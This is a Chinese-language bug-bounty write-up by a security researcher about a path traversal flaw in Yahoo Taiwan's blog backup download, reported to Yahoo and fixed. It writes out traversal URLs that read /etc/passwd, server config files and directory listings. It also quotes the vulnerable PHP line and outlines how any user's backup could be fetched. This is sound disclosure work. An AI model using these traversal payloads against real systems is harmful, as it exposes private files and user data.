---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/
title: "Yahoo Bug Bounty Part 1 - 台灣 Yahoo Blog 任意檔案下載漏洞 | Orange Tsai"
author: "Orange Tsai"
published: 2013-10-31T16:00:00.000Z
description: "Yahoo 開始有了 Bug Bounty 制度! 緣起也滿有趣的，國外有個資安專家找到 Yahoo 的 XSS 漏洞結果回報後只得到 $12.50 Yahoo Company Store 優惠卷，結果當然超不爽的，只好 po 個 爆料文 XDDD 結果開始各界撻伐 Yahoo 事情越演越烈，Yahoo Security Team 的 Director 只好發文解釋（不負責任標題翻譯： 對，我就是"
---

* * *

Yahoo 開始有了 [Bug Bounty](http://bugbounty.yahoo.com/) 制度! 緣起也滿有趣的，國外有個資安專家找到 Yahoo 的 XSS 漏洞結果回報後只得到 $12.50 [Yahoo Company Store](http://companystore.yahoo.com/) 優惠卷，結果當然超不爽的，只好 po 個 [爆料文](https://www.htbridge.com/news/what_s_your_email_security_worth_12_dollars_and_50_cents_according_to_yahoo.html) XDDD

結果開始各界撻伐 Yahoo 事情越演越烈，Yahoo Security Team 的 Director 只好發文解釋

（不負責任標題翻譯： [對，我就是那個送你感謝潮Ｔ的人](http://yahoodevelopers.tumblr.com/post/62953984019/so-im-the-guy-who-sent-the-t-shirt-out-as-a-thank-you)）

內文大意整件事件的始末，說明 Yahoo 並沒有完善的漏洞通報流程機制（商品卷還是自掏腰包買的），說明會改善這個機制，會有新的獎勵機制在 10/31 公佈，並且新的機制可追溯到 7/1 號後回報漏洞的人，並承諾會有 $150 - $15000 的 Reward（所以至少會有 150 美金耶＄＿＄）

當初看到時覺得挺有趣的就找了幾個問題回報 Yahoo，Client Side 如 XSS 就算了，比較關注在 Server Side 上面的弱點（可以直接打進 Server 比較爽）

主要回報流程是寄到 [security@yahoo-inc.com](mailto:security@yahoo-inc.com) 這個信箱進行回報的動作（英文來來回回了好多信，英文苦手嗚嗚Ｔ＿Ｔ），經過回信確認且修補完成後來發個文章記錄一下細節!

有找過兩個弱點，預計分成兩篇文章記錄一下攻擊思路跟細節

第一篇是 台灣 Yahoo Blog 的任意檔案下載漏洞，第二篇是 [\*.login.yahoo.com Remote Code Execution 遠端代碼執行漏洞](http://orange-tw.blogspot.tw/2013/11/yahoo-bug-bounty-part-2-loginyahoocom.html)。

其實兩個都不算少見的 Vulnerability，發現也不難，只是比起一般弱點，第一個需要細心以及一些經驗，第二個必須要瞭解漏洞原理並且改寫漏洞攻擊代碼

# [正文開始](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/\#%E6%AD%A3%E6%96%87%E9%96%8B%E5%A7%8B "正文開始") 正文開始

Yahoo Blog 以及無名小站將於今年關閉，官方提供了一個線上備份下載的服務，無名小站以及 Yahoo 部落格有著我國高中時期青春美好回憶，到底這樣的服務有沒有問題呢？ 讓我們繼續看下去!

點擊備份，完成後會得到一個鏈結， 是自己的使用者帳號，

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=<username>-twblog.zip

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/5c91f7a53a616b40-01.png)

點了可以下載（廢話）

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png)

本著閒閒沒事找事做的心態，`<username>` 的部分改成別人的使用者名稱會成功嗎？

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/f066cea919415f91-03.png)

登登，看起來失敗了 Ｔ＿＿Ｔ

不過沒關係我們可以來研究研究，把網址改成

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=./<username>-twblog.zip

會怎麼樣呢？

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/cbb2ed8b420372ad-02.png)

It works（感動Ｔ＿Ｔ）

看起來是有東西可以玩玩，踹踹 passwd

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=../../../../../etc/passwd

失敗Ｔ＿Ｔ 不過 /tmp 下的檔案卻可以成功，

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=../../../../../tmp/.ICE-unix

大致先猜想有 open\_basedir 之類的限制，那換成一個逗點看看呢？

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=.

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/54f13ff09847b518-05.png)

檔名是 user\_start\_download.php

大小是 8.0 KB

不過實際下載後，內容是空的，大致可以先猜想一下程式邏輯檔名部分先取得，最後再組裝路徑去讀取（或者發生某些錯誤），再把網址換成

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=/

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/8f60056ff487fcce-06.png)

檔名變成了 `7fee0293d346458a97363c56378e68d5，`配合前面幾個測試，大致可以猜想程式的邏輯，檔案存放的路徑在

> <user-hash> / <username> -twblog.zip

不過似乎 zip 存放的地方與 webroot 不同，又有 open\_basedir 的限制不能跳出來，不過如果我們可以猜到 web 路徑或是 web server 的設定檔路徑，還是有機會可以繼續玩下去的！

經過一些猜測搜尋以及發揮你駭客的直覺！會發現設定檔在：

> /home/y/conf/yapache/yapache.conf

直接讀了啦！！！

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=../../../../../home/y/conf/yapache/yapache.conf

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/295cb183bc62a5c6-07.png)

BINGO ^\_\_\_\_^ 由於 Server 又是 Unix 或是 bsd-like 的系統，所以可以直接讀取目錄

> http://tw.download.blog.yahoo.com/eol/user\_start\_download.php
>
> ?filename=../../../../home/y/share/htdocs/intlblogs/

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/016df9db36a9c427-08.png)

最後就是讀 PHP 的 Source Code，來看一下程式邏輯到底是怎麼寫的？

![](https://blog.orange.tw/posts/2013-11-yahoo-bug-bounty-part-1-yahoo-blog/318c0cb4e613f9ae-09.png)

`$filename` 從 GET 取得，沒經過檢查就放入路徑

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>$downloadFile = $downloadServer .$md5yuid. '/'. $filename;<br>``` |

最後再丟入 fopen 進行讀取的動作 ，`$md5yuid` 應該就是剛剛所說的 `<user-hash>`，產生方式是 `md5($yuid)`

`$yuid` 雖然不明瞭如何產生，不過在進行備份的動作時可以看到自己送出去的 yuid，多看幾個賬號的 yuid 靠歸納法大致可以知道是

> <username>#<2\_bytes\_random\_char>

（ Ex: account#gy ）

看懂的應該很好寫一個下載任意帳號備份的 Proof-of-Concept 吧XD

到此結案收收寄信通報! 八卦是程式碼裡面有看到簡體字還有表情符號滿可愛的 XDD